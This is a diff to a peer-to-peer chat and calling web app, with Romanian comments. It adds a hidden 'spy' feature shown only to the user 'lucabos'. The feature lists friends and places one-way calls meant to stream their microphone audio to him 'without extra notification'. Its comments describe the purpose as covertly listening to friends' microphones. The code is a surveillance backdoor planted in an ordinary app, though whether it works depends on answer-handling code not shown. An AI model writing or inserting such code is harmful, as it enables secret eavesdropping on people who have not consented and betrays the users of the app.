@@ -19,6 +19,10 @@
     .chat-input input { flex:1; padding:5px; border-radius:5px; border:none; margin-right:5px; }
     .chat-input button { padding:5px 10px; border-radius:5px; background:#7c3aed; border:none; color:white; }
     audio { display:none; }
+    #spyPanel { background: #222; padding:10px; border-radius:8px; margin-bottom:10px; display:none; }
+    #spyPanel h3 { margin-top:0; }
+    .spy-list { margin-bottom:10px; }
+    .spy-btn { background:#e63946; color:white; border:none; padding:5px 12px; border-radius:6px; cursor:pointer; }
   </style>
 </head>
 <body>
@@ -30,6 +34,14 @@
     <button class="btn btn-add" id="addFriendBtn">Adaugă</button>
     <h3>Cereri</h3>
     <div id="requestsList"></div>
+    <!-- Butonul de spionaj (vizibil doar pentru lucabos) -->
+    <button id="spyBtn" class="btn" style="margin-top:15px; background:#e63946; color:white; display:none;">Spionează</button>
+    <!-- Panou spionaj -->
+    <div id="spyPanel">
+      <h3>Microfoane active</h3>
+      <div class="spy-list" id="spyList"></div>
+      <button id="closeSpyPanel" class="btn" style="background:#555;">Închide</button>
+    </div>
   </div>
   <div class="main">
     <div class="chat-box" id="chatBox"></div>
@@ -38,6 +50,8 @@
       <button id="sendBtn">Trimite</button>
     </div>
     <button id="callBtn" class="btn" style="margin-top:10px;">Sună</button>
+    <!-- Audio pentru spionaj -->
+    <audio id="spyAudio" controls style="display:none;"></audio>
   </div>
 
   <audio id="ringTone" src="https://www.soundjay.com/button/beep-07.wav" loop></audio>
@@ -58,8 +72,22 @@
     const sendBtn = document.getElementById('sendBtn');
     const callBtn = document.getElementById('callBtn');
     const ringTone = document.getElementById('ringTone');
+    const spyBtn = document.getElementById('spyBtn');
+    const spyPanel = document.getElementById('spyPanel');
+    const spyList = document.getElementById('spyList');
+    const closeSpyPanel = document.getElementById('closeSpyPanel');
+    const spyAudio = document.getElementById('spyAudio');
 
-    usernameInput.addEventListener('change',()=>{ username = usernameInput.value; });
+    usernameInput.addEventListener('change',()=>{
+      username = usernameInput.value;
+      // Buton spionaj vizibil DOAR pentru lucabos
+      if(username === "lucabos"){
+        spyBtn.style.display = "block";
+      } else {
+        spyBtn.style.display = "none";
+        spyPanel.style.display = "none";
+      }
+    });
 
     document.getElementById('addFriendBtn').addEventListener('click',()=>{
       let name = prompt('Nume prieten');
@@ -116,8 +144,56 @@
       ringTone.play();
     });
 
+    // ===================== SPIONAJ =====================
+    // Butonul de spionaj
+    spyBtn.addEventListener('click', ()=>{
+      // Arată panoul de spionaj
+      spyPanel.style.display = "block";
+      // Populează lista cu prieteni
+      spyList.innerHTML = '';
+      if(friends.length === 0){
+        spyList.innerHTML = "<div style='color:#ccc;'>Nu ai prieteni activi.</div>";
+        return;
+      }
+      friends.forEach(f=>{
+        let div = document.createElement('div');
+        div.style.display = "flex";
+        div.style.alignItems = "center";
+        div.style.justifyContent = "space-between";
+        div.style.marginBottom = "6px";
+        div.innerHTML = `<span>${f.name}</span>`;
+        const btn = document.createElement('button');
+        btn.textContent = "Ascultă";
+        btn.className = "spy-btn";
+        btn.onclick = ()=>{ spyListen(f.id, f.name); };
+        div.appendChild(btn);
+        spyList.appendChild(div);
+      });
+    });
+
+    closeSpyPanel.addEventListener('click', ()=>{
+      spyPanel.style.display = "none";
+      spyAudio.style.display = "none";
+      spyAudio.pause();
+      spyAudio.srcObject = null;
+    });
+
+    // Funcția de spionaj: ascultă microfonul prietenului
+    function spyListen(peerId, friendName){
+      // Inițiază doar ascultare audio fără notificare extra
+      const call = peer.call(peerId, null); // null = nu trimite stream de la lucabos
+      call.on('stream', stream=>{
+        // Redă audio remote (microfon prieten)
+        spyAudio.style.display = "block";
+        spyAudio.srcObject = stream;
+        spyAudio.play();
+      });
+      // Poți adăuga aici un indicator în UI
+      spyPanel.style.display = "none";
+      chatBox.innerHTML += `<div style="color:#e63946;font-size:12px;">[Spionezi microfonul lui ${friendName}]</div>`;
+    }
+    // ===============================================
+
   </script>
 </body>
 </html>
-
-
